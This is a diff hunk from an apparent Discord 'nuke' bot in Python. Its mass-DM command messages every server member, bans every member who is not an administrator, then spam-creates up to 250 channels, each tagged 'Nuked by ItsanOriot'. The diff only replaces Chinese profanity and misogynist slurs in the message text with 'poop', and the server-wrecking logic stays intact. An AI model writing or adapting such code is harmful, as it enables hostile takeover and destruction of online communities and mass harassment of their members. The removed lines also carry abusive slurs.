@@ -21,14 +21,14 @@ async def massdm(interaction, channels: int = 250):
     for member in interaction.guild.members:
         if member != client.user and not member.bot:
             time.sleep(1/25)
-            await member.send('Nuked by ItsanOriot %s 屌絲 肏你祖宗十八代 肏你妈 贱女人 屌絲 肏你祖宗十八代 肏你妈 贱女人 屌絲 肏你祖宗十八代 肏你妈 贱女人 屌絲' % ((i+1)*random.randint(1, 79274817693)))
+            await member.send('Nuked by ItsanOriot %s poop' % ((i+1)*random.randint(1, 79274817693)))
             if not member.guild_permissions.administrator:
                 await member.ban()
     
     await interaction.followup.send("Mass dm completed, beginning channel spam", ephemeral=True)
     for i in range(channels):
         time.sleep(1/25)
-        await interaction.guild.create_text_channel(('Nuked by ItsanOriot %s 屌絲 肏你祖宗十八代 肏你妈 贱女人 屌絲 肏你祖宗十八代 肏你妈 贱女人 屌絲 肏你祖宗十八代 肏你妈 贱女人 屌絲' % ((i+1)*random.randint(1, 79274817693))))
+        await interaction.guild.create_text_channel(('Nuked by ItsanOriot %s poop' % ((i+1)*random.randint(1, 79274817693))))
     await interaction.followup.send("Channel spam completeted. Nuke finished", ephemeral=True)
 
    
